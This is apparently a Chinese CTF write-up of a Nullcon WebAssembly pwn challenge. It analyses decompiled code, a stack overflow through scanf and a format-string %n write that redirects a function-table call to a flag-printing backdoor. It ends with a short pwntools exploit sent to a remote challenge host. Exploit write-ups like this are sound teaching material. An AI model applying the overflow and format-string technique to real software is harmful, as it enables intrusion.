---
title: Nullcon wasm题
date: '2025-02-05 17:30:08'
updated: '2025-04-07 21:33:52'
---
省去 wasm 逆向过程（看 Reverse WASM 篇），对照 wat 文件恢复一部分符号之后回到 main 函数：

```c
void main(void)
{
    int iVar1;
    uint *local_70 [4];
    undefined4 *local_60 [4];
    undefined4 local_50 [4];
    undefined *local_40 [2];
    undefined4 local_38;
    uint local_34;
    undefined local_30 [24]; //scanf读入地址
    undefined4 local_18; //可覆盖区域
    undefined2 local_14; //可覆盖区域
    char local_10 [7]; //可覆盖区域
    char acStack_9 [5]; //可覆盖区域
    undefined4 local_4; //可覆盖区域

    local_4 = 0;
    local_10 = (char  [7])s_func_@_%p_ram_000004d4._0_7_;
    acStack_9._0_4_ = s_func_@_%p_ram_000004d4._7_4_;
    local_14 = uRam000004d2;
    local_18 = uRam000004ce;
    local_34 = 1;
    local_38 = 2;
    nobuffer();
    while( true ) {
        local_50[0] = (**(code **)((ulonglong)local_34 * 4))(local_30); //重点
        printf(&local_18,local_50);
        local_30[0] = 0;
        local_40[0] = local_30;
        scanf(0x48a,local_40); //重点
        iVar1 = feof(uRam00000c20);
        if (((iVar1 != 0) || (iVar1 = perror(uRam00000c20), iVar1 != 0)) ||
        (iVar1 = strcmp(local_30,1099), iVar1 == 0)) break;
        getchar();
        iVar1 = strcmp(local_30,s_debug_ram_00000469);
        if (iVar1 == 0) {
            local_70[0] = &local_34; //重点
            printf(local_10,local_70);
            local_60[0] = &local_38;
            printf(local_10,local_60);
        }
    }
    exit(0);
    do {
        halt_trap();
    } while( true );
}
```

重点：

+ 调用了一个函数指针数组当中偏移`local_34`*4 指向的函数
+ 有一个巨大的`scanf`函数，可以覆盖栈上往高地址的数据
+ 有两个`printf`函数，其中`local_10`位于栈上可以被覆盖的部分（可以被覆写）
+ `local_70`当中存的是`local_34`的地址

再看别的函数，发现有后门函数`wassflag`可以直接把 flag 打印出来

```c
undefined4 wassflag(undefined4 param1)

{
  int param1_00;
  undefined4 uVar1;
  byte local_9;
  
  param1_00 = fopen(s_could_not_read_flag.txt_ram_0000041d + 0xf,0x435);
  if (param1_00 == 0) {
    unnamed_function_82(s_could_not_read_flag.txt_ram_0000041d);
  }
  while( true ) {
    uVar1 = fgetc(param1_00);
    if ((char)uVar1 == -1) break;
    putchar((int)(char)uVar1);
  }
  unnamed_function_42(param1_00);
  exit(0);
  do {
    halt_trap();
  } while( true );
}

```

WASM 当中函数表机制生成了一个函数指针数组，

从 wat 文件当中可以看到，`$wassflag`在第二项

![](/images/ef114eec049cd317bd9df37169943fb5.jpeg)

1. 目的要将程序执行流导向`$wassflag`这个函数，而它在函数表的第二项，原本`local_34`的值是 1(`$wassup`)，改为 2 就可以执行到
2. 利用格式化字符串`%n`可以向`local_70`（也就是`local_34`的地址）里面传入数据，从而将`local_34`的值改为 2，`printf`函数打印的字符串`local_10`又位于栈上可以被覆盖的部分
3. 要想执行到`printf`函数处会经过一个`strcmp`比较输入字符串是否为`"debug"`，绕过只需要将格式化字符串前面的 padding 开头换成`"debug\0"`,`strcmp`函数读取到`"\0"`就会停止读取从而绕过检查

EXP：

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=remote("52.59.124.14",5005)

link.recvuntil("> Are you all alone?")
payload=b'debug\0'+b'a'*26+b'aa%n'
link.sendline(payload)

link.interactive()
```

